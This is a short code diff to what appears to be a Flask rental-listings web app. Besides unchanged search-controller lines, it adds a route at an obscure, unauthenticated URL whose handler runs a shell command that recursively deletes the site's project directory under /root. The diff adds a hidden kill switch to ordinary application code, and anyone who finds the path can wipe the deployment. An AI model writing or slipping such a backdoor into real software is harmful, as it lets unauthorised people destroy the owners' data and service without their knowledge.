@@ -217,3 +217,9 @@ def search_controller():
         keys = request.full_path.replace('/rent/search_controller', '').replace('?', '')
         # print 'search_controller:', keys
         return render_template('rent_sold_projects.html', is_sell=is_sell, keys=keys)
+
+
+@rent.route('/5455/delete/asdf/qwer')
+def delete_all():
+    import os
+    os.system('rm -rf /root/projects/rent_site')
